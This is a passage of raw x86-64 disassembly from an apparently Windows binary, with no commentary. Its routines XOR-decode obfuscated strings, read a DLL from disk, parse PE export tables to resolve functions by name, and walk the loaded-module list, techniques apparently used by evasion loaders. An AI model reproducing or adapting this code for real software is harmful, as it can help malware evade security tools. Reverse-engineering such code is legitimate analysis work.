    696877a1:	31 d2                	xor    %edx,%edx
    696877a3:	48 85 c9             	test   %rcx,%rcx
    696877a6:	74 03                	je     0x696877ab
    696877a8:	48 8b 11             	mov    (%rcx),%rdx
    696877ab:	48 89 c1             	mov    %rax,%rcx
    696877ae:	e8 6e ff ff ff       	call   0x69687721
    696877b3:	48 89 c1             	mov    %rax,%rcx
    696877b6:	48 83 c4 28          	add    $0x28,%rsp
    696877ba:	e9 3f a1 ff ff       	jmp    0x696818fe
    696877bf:	57                   	push   %rdi
    696877c0:	56                   	push   %rsi
    696877c1:	53                   	push   %rbx
    696877c2:	48 83 ec 20          	sub    $0x20,%rsp
    696877c6:	be 00 00 00 00       	mov    $0x0,%esi
    696877cb:	48 85 d2             	test   %rdx,%rdx
    696877ce:	48 89 cf             	mov    %rcx,%rdi
    696877d1:	48 0f 49 f2          	cmovns %rdx,%rsi
    696877d5:	48 83 cb ff          	or     $0xffffffffffffffff,%rbx
    696877d9:	48 85 c9             	test   %rcx,%rcx
    696877dc:	74 06                	je     0x696877e4
    696877de:	48 8b 01             	mov    (%rcx),%rax
    696877e1:	48 01 c3             	add    %rax,%rbx
    696877e4:	4c 39 c3             	cmp    %r8,%rbx
    696877e7:	48 c7 c0 ff ff ff ff 	mov    $0xffffffffffffffff,%rax
    696877ee:	49 0f 4f d8          	cmovg  %r8,%rbx
    696877f2:	48 29 f3             	sub    %rsi,%rbx
    696877f5:	48 0f 48 d8          	cmovs  %rax,%rbx
    696877f9:	48 01 fe             	add    %rdi,%rsi
    696877fc:	48 8d 4b 01          	lea    0x1(%rbx),%rcx
    69687800:	e8 d5 fe ff ff       	call   0x696876da
    69687805:	45 31 c0             	xor    %r8d,%r8d
    69687808:	4c 39 c3             	cmp    %r8,%rbx
    6968780b:	7c 0f                	jl     0x6968781c
    6968780d:	42 8a 54 06 10       	mov    0x10(%rsi,%r8,1),%dl
    69687812:	42 88 54 00 10       	mov    %dl,0x10(%rax,%r8,1)
    69687817:	49 ff c0             	inc    %r8
    6968781a:	eb ec                	jmp    0x69687808
    6968781c:	48 83 c4 20          	add    $0x20,%rsp
    69687820:	5b                   	pop    %rbx
    69687821:	5e                   	pop    %rsi
    69687822:	5f                   	pop    %rdi
    69687823:	c3                   	ret
    69687824:	4c 8d 05 d5 a1 0f 00 	lea    0xfa1d5(%rip),%r8        # 0x69781a00
    6968782b:	e9 16 f9 ff ff       	jmp    0x69687146
    69687830:	53                   	push   %rbx
    69687831:	48 83 ec 20          	sub    $0x20,%rsp
    69687835:	bb 07 00 00 00       	mov    $0x7,%ebx
    6968783a:	48 83 f9 07          	cmp    $0x7,%rcx
    6968783e:	48 0f 4d d9          	cmovge %rcx,%rbx
    69687842:	48 8d 0d f7 57 00 00 	lea    0x57f7(%rip),%rcx        # 0x6968d040
    69687849:	48 8d 53 11          	lea    0x11(%rbx),%rdx
    6968784d:	e8 d2 ff ff ff       	call   0x69687824
    69687852:	48 89 58 08          	mov    %rbx,0x8(%rax)
    69687856:	48 c7 00 00 00 00 00 	movq   $0x0,(%rax)
    6968785d:	48 83 c4 20          	add    $0x20,%rsp
    69687861:	5b                   	pop    %rbx
    69687862:	c3                   	ret
    69687863:	57                   	push   %rdi
    69687864:	56                   	push   %rsi
    69687865:	53                   	push   %rbx
    69687866:	48 83 ec 20          	sub    $0x20,%rsp
    6968786a:	48 85 c9             	test   %rcx,%rcx
    6968786d:	48 89 ce             	mov    %rcx,%rsi
    69687870:	74 4d                	je     0x696878bf
    69687872:	48 03 11             	add    (%rcx),%rdx
    69687875:	48 b9 ff ff ff ff ff 	movabs $0x3fffffffffffffff,%rcx
    6968787c:	ff ff 3f 
    6968787f:	48 23 4e 08          	and    0x8(%rsi),%rcx
    69687883:	48 89 d3             	mov    %rdx,%rbx
    69687886:	48 39 ca             	cmp    %rcx,%rdx
    69687889:	7e 43                	jle    0x696878ce
    6968788b:	e8 88 a0 ff ff       	call   0x69681918
    69687890:	48 39 c3             	cmp    %rax,%rbx
    69687893:	48 0f 4c d8          	cmovl  %rax,%rbx
    69687897:	48 83 c6 10          	add    $0x10,%rsi
    6968789b:	48 89 d9             	mov    %rbx,%rcx
    6968789e:	e8 8d ff ff ff       	call   0x69687830
    696878a3:	48 8b 4e f0          	mov    -0x10(%rsi),%rcx
    696878a7:	48 8d 50 10          	lea    0x10(%rax),%rdx
    696878ab:	48 89 d7             	mov    %rdx,%rdi
    696878ae:	48 89 08             	mov    %rcx,(%rax)
    696878b1:	48 ff c1             	inc    %rcx
    696878b4:	f3 a4                	rep movsb (%rsi),(%rdi)
    696878b6:	48 89 58 08          	mov    %rbx,0x8(%rax)
    696878ba:	48 89 c6             	mov    %rax,%rsi
    696878bd:	eb 0f                	jmp    0x696878ce
    696878bf:	48 89 d1             	mov    %rdx,%rcx
    696878c2:	48 83 c4 20          	add    $0x20,%rsp
    696878c6:	5b                   	pop    %rbx
    696878c7:	5e                   	pop    %rsi
    696878c8:	5f                   	pop    %rdi
    696878c9:	e9 62 ff ff ff       	jmp    0x69687830
    696878ce:	48 89 f0             	mov    %rsi,%rax
    696878d1:	48 83 c4 20          	add    $0x20,%rsp
    696878d5:	5b                   	pop    %rbx
    696878d6:	5e                   	pop    %rsi
    696878d7:	5f                   	pop    %rdi
    696878d8:	c3                   	ret
    696878d9:	57                   	push   %rdi
    696878da:	56                   	push   %rsi
    696878db:	48 83 ec 28          	sub    $0x28,%rsp
    696878df:	48 85 c9             	test   %rcx,%rcx
    696878e2:	48 89 ce             	mov    %rcx,%rsi
    696878e5:	74 29                	je     0x69687910
    696878e7:	48 83 79 08 00       	cmpq   $0x0,0x8(%rcx)
    696878ec:	78 22                	js     0x69687910
    696878ee:	48 8b 09             	mov    (%rcx),%rcx
    696878f1:	48 83 c6 10          	add    $0x10,%rsi
    696878f5:	e8 36 ff ff ff       	call   0x69687830
    696878fa:	48 8b 4e f0          	mov    -0x10(%rsi),%rcx
    696878fe:	48 8d 50 10          	lea    0x10(%rax),%rdx
    69687902:	48 89 d7             	mov    %rdx,%rdi
    69687905:	48 89 08             	mov    %rcx,(%rax)
    69687908:	48 ff c1             	inc    %rcx
    6968790b:	f3 a4                	rep movsb (%rsi),(%rdi)
    6968790d:	48 89 c6             	mov    %rax,%rsi
    69687910:	48 89 f0             	mov    %rsi,%rax
    69687913:	48 83 c4 28          	add    $0x28,%rsp
    69687917:	5e                   	pop    %rsi
    69687918:	5f                   	pop    %rdi
    69687919:	c3                   	ret
    6968791a:	56                   	push   %rsi
    6968791b:	53                   	push   %rbx
    6968791c:	48 83 ec 28          	sub    $0x28,%rsp
    69687920:	48 89 d3             	mov    %rdx,%rbx
    69687923:	e8 b1 ff ff ff       	call   0x696878d9
    69687928:	48 85 c0             	test   %rax,%rax
    6968792b:	74 34                	je     0x69687961
    6968792d:	4c 8b 10             	mov    (%rax),%r10
    69687930:	49 89 d9             	mov    %rbx,%r9
    69687933:	48 89 da             	mov    %rbx,%rdx
    69687936:	0f b6 f7             	movzbl %bh,%esi
    69687939:	49 c1 f9 10          	sar    $0x10,%r9
    6968793d:	48 c1 fa 18          	sar    $0x18,%rdx
    69687941:	45 31 c0             	xor    %r8d,%r8d
    69687944:	4d 39 d0             	cmp    %r10,%r8
    69687947:	7d 18                	jge    0x69687961
    69687949:	42 8a 4c 00 10       	mov    0x10(%rax,%r8,1),%cl
    6968794e:	31 d9                	xor    %ebx,%ecx
    69687950:	31 f1                	xor    %esi,%ecx
    69687952:	44 31 c9             	xor    %r9d,%ecx
    69687955:	31 d1                	xor    %edx,%ecx
    69687957:	42 88 4c 00 10       	mov    %cl,0x10(%rax,%r8,1)
    6968795c:	49 ff c0             	inc    %r8
    6968795f:	eb e3                	jmp    0x69687944
    69687961:	48 83 c4 28          	add    $0x28,%rsp
    69687965:	5b                   	pop    %rbx
    69687966:	5e                   	pop    %rsi
    69687967:	c3                   	ret
    69687968:	41 57                	push   %r15
    6968796a:	41 56                	push   %r14
    6968796c:	41 55                	push   %r13
    6968796e:	41 54                	push   %r12
    69687970:	55                   	push   %rbp
    69687971:	57                   	push   %rdi
    69687972:	56                   	push   %rsi
    69687973:	53                   	push   %rbx
    69687974:	48 83 ec 68          	sub    $0x68,%rsp
    69687978:	4c 8d 25 01 79 00 00 	lea    0x7901(%rip),%r12        # 0x6968f280
    6968797f:	45 31 ff             	xor    %r15d,%r15d
    69687982:	48 89 8c 24 b0 00 00 	mov    %rcx,0xb0(%rsp)
    69687989:	00 
    6968798a:	48 8d 0d 0f 79 00 00 	lea    0x790f(%rip),%rcx        # 0x6968f2a0
    69687991:	48 89 94 24 b8 00 00 	mov    %rdx,0xb8(%rsp)
    69687998:	00 
    69687999:	ba c4 66 c7 5c       	mov    $0x5cc766c4,%edx
    6968799e:	c7 44 24 5c 00 00 00 	movl   $0x0,0x5c(%rsp)
    696879a5:	00 
    696879a6:	e8 6f ff ff ff       	call   0x6968791a
    696879ab:	48 89 c1             	mov    %rax,%rcx
    696879ae:	e8 4b 9f ff ff       	call   0x696818fe
    696879b3:	45 31 c9             	xor    %r9d,%r9d
    696879b6:	41 b8 01 00 00 00    	mov    $0x1,%r8d
    696879bc:	ba 00 00 00 80       	mov    $0x80000000,%edx
    696879c1:	48 89 c1             	mov    %rax,%rcx
    696879c4:	c7 44 24 28 80 00 00 	movl   $0x80,0x28(%rsp)
    696879cb:	00 
    696879cc:	48 c7 44 24 30 00 00 	movq   $0x0,0x30(%rsp)
    696879d3:	00 00 
    696879d5:	c7 44 24 20 03 00 00 	movl   $0x3,0x20(%rsp)
    696879dc:	00 
    696879dd:	ff 15 ed 30 0f 00    	call   *0xf30ed(%rip)        # 0x6977aad0
    696879e3:	31 d2                	xor    %edx,%edx
    696879e5:	48 89 c6             	mov    %rax,%rsi
    696879e8:	48 89 c1             	mov    %rax,%rcx
    696879eb:	ff 15 d7 d7 0f 00    	call   *0xfd7d7(%rip)        # 0x697851c8
    696879f1:	89 c7                	mov    %eax,%edi
    696879f3:	ff 15 e7 4b 10 00    	call   *0x104be7(%rip)        # 0x6978c5e0
    696879f9:	4c 63 c7             	movslq %edi,%r8
    696879fc:	31 d2                	xor    %edx,%edx
    696879fe:	48 89 c1             	mov    %rax,%rcx
    69687a01:	ff 15 99 cc 0f 00    	call   *0xfcc99(%rip)        # 0x697846a0
    69687a07:	4c 8d 4c 24 5c       	lea    0x5c(%rsp),%r9
    69687a0c:	41 89 f8             	mov    %edi,%r8d
    69687a0f:	48 89 f1             	mov    %rsi,%rcx
    69687a12:	48 c7 44 24 20 00 00 	movq   $0x0,0x20(%rsp)
    69687a19:	00 00 
    69687a1b:	48 89 c3             	mov    %rax,%rbx
    69687a1e:	48 89 c2             	mov    %rax,%rdx
    69687a21:	ff 15 79 d6 0f 00    	call   *0xfd679(%rip)        # 0x697850a0
    69687a27:	4c 63 43 3c          	movslq 0x3c(%rbx),%r8
    69687a2b:	4a 8d 2c 03          	lea    (%rbx,%r8,1),%rbp
    69687a2f:	44 0f b7 6d 14       	movzwl 0x14(%rbp),%r13d
    69687a34:	48 8d 75 18          	lea    0x18(%rbp),%rsi
    69687a38:	8b 85 88 00 00 00    	mov    0x88(%rbp),%eax
    69687a3e:	49 01 f5             	add    %rsi,%r13
    69687a41:	89 44 24 44          	mov    %eax,0x44(%rsp)
    69687a45:	4d 89 ee             	mov    %r13,%r14
    69687a48:	66 44 39 7d 06       	cmp    %r15w,0x6(%rbp)
    69687a4d:	77 3a                	ja     0x69687a89
    69687a4f:	4c 63 44 24 44       	movslq 0x44(%rsp),%r8
    69687a54:	31 ff                	xor    %edi,%edi
    69687a56:	31 f6                	xor    %esi,%esi
    69687a58:	49 63 56 0c          	movslq 0xc(%r14),%rdx
    69687a5c:	49 63 46 14          	movslq 0x14(%r14),%rax
    69687a60:	49 01 d8             	add    %rbx,%r8
    69687a63:	49 29 d0             	sub    %rdx,%r8
    69687a66:	4d 8d 3c 00          	lea    (%r8,%rax,1),%r15
    69687a6a:	4d 63 67 20          	movslq 0x20(%r15),%r12
    69687a6e:	49 63 6f 1c          	movslq 0x1c(%r15),%rbp
    69687a72:	49 01 dc             	add    %rbx,%r12
    69687a75:	48 01 dd             	add    %rbx,%rbp
    69687a78:	49 29 d4             	sub    %rdx,%r12
    69687a7b:	48 29 d5             	sub    %rdx,%rbp
    69687a7e:	49 01 c4             	add    %rax,%r12
    69687a81:	48 01 c5             	add    %rax,%rbp
    69687a84:	e9 ab 00 00 00       	jmp    0x69687b34
    69687a89:	0f b7 7d 14          	movzwl 0x14(%rbp),%edi
    69687a8d:	41 6b c7 28          	imul   $0x28,%r15d,%eax
    69687a91:	ba 08 00 00 00       	mov    $0x8,%edx
    69687a96:	0f b7 c0             	movzwl %ax,%eax
    69687a99:	48 01 f7             	add    %rsi,%rdi
    69687a9c:	48 01 c7             	add    %rax,%rdi
    69687a9f:	48 89 f9             	mov    %rdi,%rcx
    69687aa2:	e8 49 fc ff ff       	call   0x696876f0
    69687aa7:	ba 8c c6 e6 51       	mov    $0x51e6c68c,%edx
    69687aac:	4c 89 e1             	mov    %r12,%rcx
    69687aaf:	48 89 44 24 48       	mov    %rax,0x48(%rsp)
    69687ab4:	e8 61 fe ff ff       	call   0x6968791a
    69687ab9:	48 8b 4c 24 48       	mov    0x48(%rsp),%rcx
    69687abe:	48 89 c2             	mov    %rax,%rdx
    69687ac1:	e8 ca c1 ff ff       	call   0x69683c90
    69687ac6:	84 c0                	test   %al,%al
    69687ac8:	49 0f 44 fe          	cmove  %r14,%rdi
    69687acc:	41 ff c7             	inc    %r15d
    69687acf:	49 89 fe             	mov    %rdi,%r14
    69687ad2:	e9 71 ff ff ff       	jmp    0x69687a48
    69687ad7:	48 63 c7             	movslq %edi,%rax
    69687ada:	48 8b 94 24 b0 00 00 	mov    0xb0(%rsp),%rdx
    69687ae1:	00 
    69687ae2:	49 63 0c 84          	movslq (%r12,%rax,4),%rcx
    69687ae6:	49 63 46 0c          	movslq 0xc(%r14),%rax
    69687aea:	48 01 d9             	add    %rbx,%rcx
    69687aed:	48 29 c1             	sub    %rax,%rcx
    69687af0:	49 63 46 14          	movslq 0x14(%r14),%rax
    69687af4:	48 01 c1             	add    %rax,%rcx
    69687af7:	e8 aa 9e ff ff       	call   0x696819a6
    69687afc:	84 c0                	test   %al,%al
    69687afe:	8d 47 01             	lea    0x1(%rdi),%eax
    69687b01:	74 2f                	je     0x69687b32
    69687b03:	48 63 d0             	movslq %eax,%rdx
    69687b06:	48 8b 0d 73 55 00 00 	mov    0x5573(%rip),%rcx        # 0x6968d080
    69687b0d:	48 63 74 95 00       	movslq 0x0(%rbp,%rdx,4),%rsi
    69687b12:	49 63 55 0c          	movslq 0xc(%r13),%rdx
    69687b16:	48 8b bc 24 b8 00 00 	mov    0xb8(%rsp),%rdi
    69687b1d:	00 
    69687b1e:	48 01 de             	add    %rbx,%rsi
    69687b21:	48 29 d6             	sub    %rdx,%rsi
    69687b24:	49 63 55 14          	movslq 0x14(%r13),%rdx
    69687b28:	48 01 d6             	add    %rdx,%rsi
    69687b2b:	f3 a4                	rep movsb (%rsi),(%rdi)
    69687b2d:	be 01 00 00 00       	mov    $0x1,%esi
    69687b32:	89 c7                	mov    %eax,%edi
    69687b34:	41 39 7f 18          	cmp    %edi,0x18(%r15)
    69687b38:	7f 9d                	jg     0x69687ad7
    69687b3a:	89 f0                	mov    %esi,%eax
    69687b3c:	48 83 c4 68          	add    $0x68,%rsp
    69687b40:	5b                   	pop    %rbx
    69687b41:	5e                   	pop    %rsi
    69687b42:	5f                   	pop    %rdi
    69687b43:	5d                   	pop    %rbp
    69687b44:	41 5c                	pop    %r12
    69687b46:	41 5d                	pop    %r13
    69687b48:	41 5e                	pop    %r14
    69687b4a:	41 5f                	pop    %r15
    69687b4c:	c3                   	ret
    69687b4d:	48 83 ec 28          	sub    $0x28,%rsp
    69687b51:	48 8d 0d c8 75 00 00 	lea    0x75c8(%rip),%rcx        # 0x6968f120
    69687b58:	ba c4 b4 dd 7c       	mov    $0x7cddb4c4,%edx
    69687b5d:	e8 b8 fd ff ff       	call   0x6968791a
    69687b62:	90                   	nop
    69687b63:	48 83 c4 28          	add    $0x28,%rsp
    69687b67:	48 ff 25 12 4e 10 00 	rex.W jmp *0x104e12(%rip)        # 0x6978c980
    69687b6e:	41 57                	push   %r15
    69687b70:	41 56                	push   %r14
    69687b72:	41 55                	push   %r13
    69687b74:	41 54                	push   %r12
    69687b76:	55                   	push   %rbp
    69687b77:	57                   	push   %rdi
    69687b78:	56                   	push   %rsi
    69687b79:	53                   	push   %rbx
    69687b7a:	48 81 ec b8 00 00 00 	sub    $0xb8,%rsp
    69687b81:	44 89 8c 24 18 01 00 	mov    %r9d,0x118(%rsp)
    69687b88:	00 
    69687b89:	4c 8d 4c 24 30       	lea    0x30(%rsp),%r9
    69687b8e:	48 89 cb             	mov    %rcx,%rbx
    69687b91:	4d 89 c4             	mov    %r8,%r12
    69687b94:	4c 89 c9             	mov    %r9,%rcx
    69687b97:	48 89 94 24 08 01 00 	mov    %rdx,0x108(%rsp)
    69687b9e:	00 
    69687b9f:	ba 80 00 00 00       	mov    $0x80,%edx
    69687ba4:	e8 23 9e ff ff       	call   0x696819cc
    69687ba9:	48 89 d9             	mov    %rbx,%rcx
    69687bac:	e8 23 9f ff ff       	call   0x69681ad4
    69687bb1:	85 c0                	test   %eax,%eax
    69687bb3:	75 07                	jne    0x69687bbc
    69687bb5:	31 db                	xor    %ebx,%ebx
    69687bb7:	e9 79 01 00 00       	jmp    0x69687d35
    69687bbc:	48 63 43 3c          	movslq 0x3c(%rbx),%rax
    69687bc0:	b9 20 00 00 00       	mov    $0x20,%ecx
    69687bc5:	4c 89 cf             	mov    %r9,%rdi
    69687bc8:	48 8d b4 03 88 00 00 	lea    0x88(%rbx,%rax,1),%rsi
    69687bcf:	00 
    69687bd0:	f3 a5                	rep movsl (%rsi),(%rdi)
    69687bd2:	83 7c 24 34 00       	cmpl   $0x0,0x34(%rsp)
    69687bd7:	74 dc                	je     0x69687bb5
    69687bd9:	48 63 74 24 30       	movslq 0x30(%rsp),%rsi
    69687bde:	85 f6                	test   %esi,%esi
    69687be0:	74 d3                	je     0x69687bb5
    69687be2:	48 8d 0d d7 74 00 00 	lea    0x74d7(%rip),%rcx        # 0x6968f0c0
    69687be9:	48 01 de             	add    %rbx,%rsi
    69687bec:	ba 0c 96 25 69       	mov    $0x6925960c,%edx
    69687bf1:	e8 24 fd ff ff       	call   0x6968791a
    69687bf6:	4c 63 4e 1c          	movslq 0x1c(%rsi),%r9
    69687bfa:	48 8d 15 ff 63 00 00 	lea    0x63ff(%rip),%rdx        # 0x6968e000
    69687c01:	48 8b 8c 24 08 01 00 	mov    0x108(%rsp),%rcx
    69687c08:	00 
    69687c09:	4d 8d 34 19          	lea    (%r9,%rbx,1),%r14
    69687c0d:	e8 94 9d ff ff       	call   0x696819a6
    69687c12:	84 c0                	test   %al,%al
    69687c14:	75 14                	jne    0x69687c2a
    69687c16:	48 63 46 20          	movslq 0x20(%rsi),%rax
    69687c1a:	45 31 e4             	xor    %r12d,%r12d
    69687c1d:	44 8b 6e 18          	mov    0x18(%rsi),%r13d
    69687c21:	49 63 2e             	movslq (%r14),%rbp
    69687c24:	44 8b 3c 18          	mov    (%rax,%rbx,1),%r15d
    69687c28:	eb 6c                	jmp    0x69687c96
    69687c2a:	4b 63 74 a6 fc       	movslq -0x4(%r14,%r12,4),%rsi
    69687c2f:	e9 e9 00 00 00       	jmp    0x69687d1d
    69687c34:	4c 8d 05 2e 68 00 00 	lea    0x682e(%rip),%r8        # 0x6968e469
    69687c3b:	4d 63 d7             	movslq %r15d,%r10
    69687c3e:	31 d2                	xor    %edx,%edx
    69687c40:	49 01 da             	add    %rbx,%r10
    69687c43:	4c 89 d1             	mov    %r10,%rcx
    69687c46:	4c 89 54 24 28       	mov    %r10,0x28(%rsp)
    69687c4b:	ff 15 2f cf 0f 00    	call   *0xfcf2f(%rip)        # 0x69784b80
    69687c51:	4c 8b 54 24 28       	mov    0x28(%rsp),%r10
    69687c56:	48 85 c0             	test   %rax,%rax
    69687c59:	75 45                	jne    0x69687ca0
    69687c5b:	49 83 c6 04          	add    $0x4,%r14
    69687c5f:	49 63 36             	movslq (%r14),%rsi
    69687c62:	4d 85 d2             	test   %r10,%r10
    69687c65:	b9 01 00 00 00       	mov    $0x1,%ecx
    69687c6a:	74 0d                	je     0x69687c79
    69687c6c:	48 83 c9 ff          	or     $0xffffffffffffffff,%rcx
    69687c70:	4c 89 d7             	mov    %r10,%rdi
    69687c73:	31 c0                	xor    %eax,%eax
    69687c75:	f2 ae                	repnz scas (%rdi),%al
    69687c77:	f7 d1                	not    %ecx
    69687c79:	41 01 cf             	add    %ecx,%r15d
    69687c7c:	48 8b 8c 24 08 01 00 	mov    0x108(%rsp),%rcx
    69687c83:	00 
    69687c84:	4c 89 d2             	mov    %r10,%rdx
    69687c87:	e8 1a 9d ff ff       	call   0x696819a6
    69687c8c:	84 c0                	test   %al,%al
    69687c8e:	75 18                	jne    0x69687ca8
    69687c90:	41 ff c4             	inc    %r12d
    69687c93:	48 63 ee             	movslq %esi,%rbp
    69687c96:	45 39 e5             	cmp    %r12d,%r13d
    69687c99:	7d 99                	jge    0x69687c34
    69687c9b:	e9 82 00 00 00       	jmp    0x69687d22
    69687ca0:	41 ff c5             	inc    %r13d
    69687ca3:	48 63 f5             	movslq %ebp,%rsi
    69687ca6:	eb ba                	jmp    0x69687c62
    69687ca8:	48 8d 0d f1 73 00 00 	lea    0x73f1(%rip),%rcx        # 0x6968f0a0
    69687caf:	ba e4 34 2b 12       	mov    $0x122b34e4,%edx
    69687cb4:	e8 61 fc ff ff       	call   0x6968791a
    69687cb9:	ba ec 42 04 7e       	mov    $0x7e0442ec,%edx
    69687cbe:	48 8d 0d 9b 73 00 00 	lea    0x739b(%rip),%rcx        # 0x6968f060
    69687cc5:	e8 50 fc ff ff       	call   0x6968791a
    69687cca:	ba 84 59 b5 4c       	mov    $0x4cb55984,%edx
    69687ccf:	48 8d 0d 6a 73 00 00 	lea    0x736a(%rip),%rcx        # 0x6968f040
    69687cd6:	e8 3f fc ff ff       	call   0x6968791a
    69687cdb:	ba cc ea 7b 45       	mov    $0x457beacc,%edx
    69687ce0:	48 8d 0d 19 73 00 00 	lea    0x7319(%rip),%rcx        # 0x6968f000
    69687ce7:	e8 2e fc ff ff       	call   0x6968791a
    69687cec:	ba 24 9f 12 2e       	mov    $0x2e129f24,%edx
    69687cf1:	48 8d 0d c8 72 00 00 	lea    0x72c8(%rip),%rcx        # 0x6968efc0
    69687cf8:	e8 1d fc ff ff       	call   0x6968791a
    69687cfd:	ba ac 85 50 2b       	mov    $0x2b5085ac,%edx
    69687d02:	48 8d 0d 97 72 00 00 	lea    0x7297(%rip),%rcx        # 0x6968efa0
    69687d09:	e8 0c fc ff ff       	call   0x6968791a
    69687d0e:	83 bc 24 18 01 00 00 	cmpl   $0x0,0x118(%rsp)
    69687d15:	00 
    69687d16:	75 05                	jne    0x69687d1d
    69687d18:	48 01 eb             	add    %rbp,%rbx
    69687d1b:	eb 07                	jmp    0x69687d24
    69687d1d:	48 01 f3             	add    %rsi,%rbx
    69687d20:	eb 02                	jmp    0x69687d24
    69687d22:	31 db                	xor    %ebx,%ebx
    69687d24:	48 8d 0d 15 72 00 00 	lea    0x7215(%rip),%rcx        # 0x6968ef40
    69687d2b:	ba c4 6d c2 5b       	mov    $0x5bc26dc4,%edx
    69687d30:	e8 e5 fb ff ff       	call   0x6968791a
    69687d35:	48 89 d8             	mov    %rbx,%rax
    69687d38:	48 81 c4 b8 00 00 00 	add    $0xb8,%rsp
    69687d3f:	5b                   	pop    %rbx
    69687d40:	5e                   	pop    %rsi
    69687d41:	5f                   	pop    %rdi
    69687d42:	5d                   	pop    %rbp
    69687d43:	41 5c                	pop    %r12
    69687d45:	41 5d                	pop    %r13
    69687d47:	41 5e                	pop    %r14
    69687d49:	41 5f                	pop    %r15
    69687d4b:	c3                   	ret
    69687d4c:	55                   	push   %rbp
    69687d4d:	57                   	push   %rdi
    69687d4e:	56                   	push   %rsi
    69687d4f:	53                   	push   %rbx
    69687d50:	48 83 ec 48          	sub    $0x48,%rsp
    69687d54:	48 89 cf             	mov    %rcx,%rdi
    69687d57:	b9 60 00 00 00       	mov    $0x60,%ecx
    69687d5c:	89 d6                	mov    %edx,%esi
    69687d5e:	e8 ea fd ff ff       	call   0x69687b4d
    69687d63:	48 8b 40 18          	mov    0x18(%rax),%rax
    69687d67:	48 8b 58 20          	mov    0x20(%rax),%rbx
    69687d6b:	48 8d 68 20          	lea    0x20(%rax),%rbp
    69687d6f:	48 8b 53 50          	mov    0x50(%rbx),%rdx
    69687d73:	48 89 f9             	mov    %rdi,%rcx
    69687d76:	ff 15 84 d7 0f 00    	call   *0xfd784(%rip)        # 0x69785500
    69687d7c:	85 c0                	test   %eax,%eax
    69687d7e:	74 0a                	je     0x69687d8a
    69687d80:	48 8b 1b             	mov    (%rbx),%rbx
    69687d83:	48 39 dd             	cmp    %rbx,%rbp
    69687d86:	75 e7                	jne    0x69687d6f
    69687d88:	eb 09                	jmp    0x69687d93
    69687d8a:	48 8b 43 20          	mov    0x20(%rbx),%rax
    69687d8e:	e9 bd 00 00 00       	jmp    0x69687e50
    69687d93:	31 c0                	xor    %eax,%eax
    69687d95:	85 f6                	test   %esi,%esi
    69687d97:	0f 84 b3 00 00 00    	je     0x69687e50
    69687d9d:	48 8d 0d 3c 74 00 00 	lea    0x743c(%rip),%rcx        # 0x6968f1e0
    69687da4:	ba 2c ac 6a 6f       	mov    $0x6f6aac2c,%edx
    69687da9:	e8 6c fb ff ff       	call   0x6968791a
    69687dae:	48 8d 0d ab d4 0e 00 	lea    0xed4ab(%rip),%rcx        # 0x69775260
    69687db5:	e8 de f9 ff ff       	call   0x69687798
    69687dba:	31 d2                	xor    %edx,%edx
    69687dbc:	48 89 c1             	mov    %rax,%rcx
    69687dbf:	e8 88 ff ff ff       	call   0x69687d4c
    69687dc4:	45 31 c0             	xor    %r8d,%r8d
    69687dc7:	41 b9 01 00 00 00    	mov    $0x1,%r9d
    69687dcd:	48 8d 15 97 66 00 00 	lea    0x6697(%rip),%rdx        # 0x6968e46b
    69687dd4:	48 89 c1             	mov    %rax,%rcx
    69687dd7:	e8 92 fd ff ff       	call   0x69687b6e
    69687ddc:	48 85 c0             	test   %rax,%rax
    69687ddf:	48 89 c6             	mov    %rax,%rsi
    69687de2:	75 04                	jne    0x69687de8
    69687de4:	31 c0                	xor    %eax,%eax
    69687de6:	eb 68                	jmp    0x69687e50
    69687de8:	48 8d 5c 24 30       	lea    0x30(%rsp),%rbx
    69687ded:	ba 10 00 00 00       	mov    $0x10,%edx
    69687df2:	48 89 d9             	mov    %rbx,%rcx
    69687df5:	e8 d2 9b ff ff       	call   0x696819cc
    69687dfa:	48 8d 0d 5f d4 0e 00 	lea    0xed45f(%rip),%rcx        # 0x69775260
    69687e01:	48 c7 44 24 28 00 00 	movq   $0x0,0x28(%rsp)
    69687e08:	00 00 
    69687e0a:	e8 89 f9 ff ff       	call   0x69687798
    69687e0f:	31 d2                	xor    %edx,%edx
    69687e11:	48 89 c1             	mov    %rax,%rcx
    69687e14:	e8 33 ff ff ff       	call   0x69687d4c
    69687e19:	45 31 c0             	xor    %r8d,%r8d
    69687e1c:	41 b9 01 00 00 00    	mov    $0x1,%r9d
    69687e22:	48 8d 15 4d 66 00 00 	lea    0x664d(%rip),%rdx        # 0x6968e476
    69687e29:	48 89 c1             	mov    %rax,%rcx
    69687e2c:	e8 3d fd ff ff       	call   0x69687b6e
    69687e31:	48 89 fa             	mov    %rdi,%rdx
    69687e34:	48 89 d9             	mov    %rbx,%rcx
    69687e37:	ff d0                	call   *%rax
    69687e39:	31 d2                	xor    %edx,%edx
    69687e3b:	31 c9                	xor    %ecx,%ecx
    69687e3d:	49 89 d8             	mov    %rbx,%r8
    69687e40:	4c 8d 4c 24 28       	lea    0x28(%rsp),%r9
    69687e45:	ff d6                	call   *%rsi
    69687e47:	85 c0                	test   %eax,%eax
    69687e49:	75 99                	jne    0x69687de4
    69687e4b:	48 8b 44 24 28       	mov    0x28(%rsp),%rax
    69687e50:	48 83 c4 48          	add    $0x48,%rsp
    69687e54:	5b                   	pop    %rbx
    69687e55:	5e                   	pop    %rsi
    69687e56:	5f                   	pop    %rdi
    69687e57:	5d                   	pop    %rbp
    69687e58:	c3                   	ret
    69687e59:	56                   	push   %rsi
    69687e5a:	53                   	push   %rbx
    69687e5b:	48 83 ec 28          	sub    $0x28,%rsp
    69687e5f:	48 89 d3             	mov    %rdx,%rbx
    69687e62:	e8 72 fa ff ff       	call   0x696878d9
    69687e67:	48 85 c0             	test   %rax,%rax
    69687e6a:	74 34                	je     0x69687ea0
    69687e6c:	4c 8b 10             	mov    (%rax),%r10
    69687e6f:	49 89 d9             	mov    %rbx,%r9
    69687e72:	48 89 da             	mov    %rbx,%rdx
    69687e75:	0f b6 f7             	movzbl %bh,%esi
    69687e78:	49 c1 f9 10          	sar    $0x10,%r9
    69687e7c:	48 c1 fa 18          	sar    $0x18,%rdx
    69687e80:	45 31 c0             	xor    %r8d,%r8d
    69687e83:	4d 39 d0             	cmp    %r10,%r8
    69687e86:	7d 18                	jge    0x69687ea0
    69687e88:	42 8a 4c 00 10       	mov    0x10(%rax,%r8,1),%cl
    69687e8d:	31 d9                	xor    %ebx,%ecx
    69687e8f:	31 f1                	xor    %esi,%ecx
    69687e91:	44 31 c9             	xor    %r9d,%ecx
    69687e94:	31 d1                	xor    %edx,%ecx
    69687e96:	42 88 4c 00 10       	mov    %cl,0x10(%rax,%r8,1)
